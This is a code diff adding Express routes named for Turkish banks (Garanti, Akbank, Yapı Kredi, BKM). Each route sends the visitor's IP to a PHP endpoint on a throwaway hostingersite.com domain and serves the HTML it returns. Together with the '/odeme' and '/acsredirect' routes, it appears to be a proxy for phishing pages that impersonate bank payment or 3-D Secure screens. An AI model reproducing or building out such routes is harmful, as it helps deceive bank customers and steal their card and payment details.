@@ -95,6 +95,74 @@ app.get('/odeme', async (req, res) => {
   }
 });
 
+app.get('/payment/garanti', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/odeme.php',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+    res.send(response.data);
+  } catch (error) {
+    console.error('Ödeme sayfası hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
+
+app.get('/payment/akbank', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/payment/akbank.php',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+    res.send(response.data);
+  } catch (error) {
+    console.error('Ödeme sayfası hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
+
+app.get('/payment/yapikredi', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/payment/yapikredi.php',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+    res.send(response.data);
+  } catch (error) {
+    console.error('Ödeme sayfası hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
+
+app.get('/payment/bkm', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/payment/bkm.php',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+    res.send(response.data);
+  } catch (error) {
+    console.error('Ödeme sayfası hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
+
 app.get('/acsredirect', async (req, res) => {
   try {
     const clientIp = getClientIp(req);
